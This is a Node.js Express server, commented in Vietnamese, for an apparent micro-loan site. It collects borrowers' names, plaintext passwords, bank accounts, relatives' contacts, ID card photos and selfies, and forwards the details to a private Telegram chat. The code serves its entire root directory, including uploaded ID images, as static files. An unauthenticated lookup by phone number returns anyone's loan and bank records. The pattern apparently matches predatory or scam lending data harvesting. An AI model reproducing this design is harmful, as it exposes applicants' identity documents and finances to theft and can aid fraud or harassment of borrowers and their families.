const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Cho phép phục vụ file tĩnh trực tiếp từ thư mục gốc
app.use(express.static(__dirname));

// LẤY MÃ BOT TELEGRAM VÀ CHAT ID TỪ RENDER ENVIRONMENT
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

// HÀM GỬI THÔNG BÁO TELEGRAM CÓ BÁO LỖI LOG
async function sendTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.log('⚠️ Thiếu TELEGRAM_BOT_TOKEN hoặc TELEGRAM_CHAT_ID trong Environment Variables!');
        return;
    }
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const res = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        const data = await res.json();
        if (!data.ok) {
            console.error('❌ Telegram API Error:', data.description);
        } else {
            console.log('✅ Gửi thông báo Telegram thành công!');
        }
    } catch (e) {
        console.error('❌ Lỗi kết nối Telegram:', e.message);
    }
}

// LƯU TRỮ TẠM DỮ LIỆU
let users = [];
let loans = [];

// API: ĐĂNG KÝ
app.post('/api/register', (req, res) => {
    const { name, phone, password } = req.body;
    if (!name || !phone || !password) {
        return res.json({ success: false, message: 'Vui lòng điền đầy đủ thông tin!' });
    }
    if (users.find(u => u.phone === phone)) {
        return res.json({ success: false, message: 'Số điện thoại này đã được đăng ký!' });
    }
    const newUser = { id: Date.now(), name, phone, password, rank: 'Đồng (Mới)', completedLoans: 0 };
    users.push(newUser);

    sendTelegram(`🆕 <b>THÀNH VIÊN MỚI ĐĂNG KÝ</b>\n👤 <b>Họ tên:</b> ${name}\n📞 <b>SĐT:</b> ${phone}\n🏆 <b>Hạn mức ban đầu:</b> 500,000 VNĐ`);

    res.json({ success: true, user: newUser });
});

// API: NỘP HỒ SƠ VAY
const upload = multer({ dest: 'uploads/' });
app.post('/api/submit-loan', upload.fields([{ name: 'cccdFront' }, { name: 'selfie' }]), (req, res) => {
    const { fullName, phone, bankName, bankAccount, amount, days, relativeRelation, relativeName, relativePhone } = req.body;
    
    if (!fullName || !phone || !bankName || !bankAccount || !amount || !days) {
        return res.json({ success: false, message: 'Vui lòng nhập đầy đủ thông tin vay!' });
    }

    const user = users.find(u => u.phone === phone);
    const completedCount = user ? user.completedLoans : 0;
    
    if (completedCount < 3 && parseInt(amount) > 500000) {
        return res.json({ success: false, message: 'Khách hàng mới chỉ được vay tối đa 500.000 VNĐ ở khoản vay đầu tiên!' });
    }

    const loanId = 'VAY' + Math.floor(100000 + Math.random() * 900000);
    const newLoan = {
        loanId, fullName, phone, bankName, bankAccount,
        amount: parseInt(amount), days: parseInt(days),
        relativeRelation, relativeName, relativePhone,
        status: 'Chờ duyệt',
        createdAt: new Date().toLocaleString('vi-VN')
    };
    loans.push(newLoan);

    sendTelegram(
        `🚨 <b>HỒ SƠ VAY MỚI MÃ #${loanId}</b>\n` +
        `👤 <b>Họ tên:</b> ${fullName}\n` +
        `📞 <b>SĐT:</b> ${phone}\n` +
        `💰 <b>Số tiền vay:</b> ${parseInt(amount).toLocaleString('vi-VN')} VNĐ (${days} ngày)\n` +
        `🏦 <b>STK Ngân hàng:</b> ${bankName} - ${bankAccount}\n` +
        `👨‍👩‍👧 <b>Người thân:</b> ${relativeName || 'N/A'} (${relativeRelation || 'N/A'} - ${relativePhone || 'N/A'})`
    );

    res.json({ success: true, loanId });
});

// API: TRA CỨU HỒ SƠ VAY BẰNG SỐ ĐIỆN THOẠI
app.get('/api/search-loan/:phone', (req, res) => {
    const userLoans = loans.filter(l => l.phone === req.params.phone);
    res.json({ success: true, loans: userLoans });
});

// PHỤC VỤ TRANG CHỦ
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Server đang chạy trên cổng ${PORT}`));
